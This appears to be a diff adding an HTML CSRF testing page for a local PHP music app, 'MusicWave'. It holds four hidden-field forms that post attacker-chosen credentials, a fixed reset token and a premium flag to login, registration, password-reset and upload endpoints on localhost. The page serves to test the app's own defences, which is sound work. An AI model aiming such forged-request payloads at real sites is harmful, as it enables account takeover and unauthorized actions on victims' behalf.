@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>MusicWave - CSRF Security Testing Suite</title>
+    <style>
+        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #f4f6f9; color: #333; padding: 40px; text-align: center; }
+        .test-container { background: white; padding: 30px; border-radius: 8px; max-width: 700px; margin: 0 auto; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; }
+        h1 { color: #2b7a78; margin-bottom: 10px; }
+        .description { color: #64748b; font-size: 14px; margin-bottom: 30px; }
+        .test-card { background: #f8fafc; border: 1px solid #e2e8f0; padding: 20px; border-radius: 6px; margin-bottom: 25px; text-align: left; }
+        .test-card h3 { margin-top: 0; color: #17252a; border-bottom: 2px solid #3aafa9; padding-bottom: 5px; display: inline-block; }
+        .test-card p { font-size: 13px; color: #475569; margin: 10px 0; }
+        .btn-attack { background-color: #e11d48; color: white; border: none; padding: 10px 20px; font-weight: bold; border-radius: 4px; cursor: pointer; text-transform: uppercase; font-size: 12px; letter-spacing: 0.5px; transition: background 0.2s; }
+        .btn-attack:hover { background-color: #be123c; }
+    </style>
+</head>
+<body>
+
+    <div class="test-container">
+        <h1>CSRF Attack Simulation Panel</h1>
+        <p class="description">Please log in to MusicWave normally in another tab, then come back here and click the buttons to simulate sending unauthorized cross-site requests.</p>
+
+        <div class="test-card">
+            <h3>Scenario 1: Cross-Site Login Exploit</h3>
+            <p><strong>Target:</strong> <code>login.php</code> (Method: POST)</p>
+            <p>Attempts to force authentication or pollute the session by sending arbitrary credentials without passing the session CSRF token.</p>
+            
+            <form id="csrfFormLogin" action="http://localhost/login.php" method="POST" target="_blank">
+                <input type="hidden" name="email" value="attacker@evil.com" />
+                <input type="hidden" name="password" value="AttackerPassword2026!" />
+                <button type="submit" class="btn-attack">Launch Login Attack</button>
+            </form>
+        </div>
+
+        <div class="test-card">
+            <h3>Scenario 2: Unauthorized Account Creation</h3>
+            <p><strong>Target:</strong> <code>register.php</code> (Method: POST)</p>
+            <p>It forces the victim's browser to submit a registration request for a surreptitious malicious account without the user's knowledge.</p>
+            
+            <form id="csrfFormRegister" action="http://localhost/register.php" method="POST" target="_blank">
+                <input type="hidden" name="username" value="attacker_user" />
+                <input type="hidden" name="email" value="attacker@evil.com" />
+                <input type="hidden" name="password" value="PasswordSicura2026!" />
+                <input type="hidden" name="confirm_password" value="PasswordSicura2026!" />
+                <button type="submit" class="btn-attack">Launch Registration Attack</button>
+            </form>
+        </div>
+
+        <div class="test-card">
+            <h3>Scenario 3: Forced Password Overwrite</h3>
+            <p><strong>Target:</strong> <code>reset_password.php</code> (Method: POST)</p>
+            <p>It exploits the recovery session to force a permanent password change by setting the attacker's credentials without a valid CSRF token.</p>
+            
+            <form id="csrfFormReset" action="http://localhost/reset_password.php" method="POST" target="_blank">
+                <input type="hidden" name="token" value="d3f4b23a8e7182cfbc93aef4312894aef81923481023cdab8e19284371fa823d" />
+                <input type="hidden" name="password_new" value="AttackerPassword2026!" />
+                <input type="hidden" name="password_confirm" value="AttackerPassword2026!" />
+                <button type="submit" class="btn-attack">Launch Password Reset Attack</button>
+            </form>
+        </div>
+
+        <div class="test-card">
+            <h3>Scenario 4: Unauthorized Media Upload</h3>
+            <p><strong>Target:</strong> <code>upload.php</code> (Method: POST + Multipart)</p>
+            <p>Attempts to force upload metadata and records to the media database on behalf of the logged in user, bypassing the integrity check.</p>
+            
+            <form id="csrfFormUpload" action="http://localhost/upload.php" method="POST" enctype="multipart/form-data" target="_blank">
+                <input type="hidden" name="upload_type" value="audio" />
+                <input type="hidden" name="title" value="Fake CSRF Track" />
+                <input type="hidden" name="author" value="Attacker" />
+                <input type="hidden" name="MAX_FILE_SIZE" value="10485760" />
+                <input type="hidden" name="is_premium" value="1" />
+                <button type="submit" class="btn-attack">Launch Media Upload Attack</button>
+            </form>
+        </div>
+
+    </div>
+
+</body>
+</html>
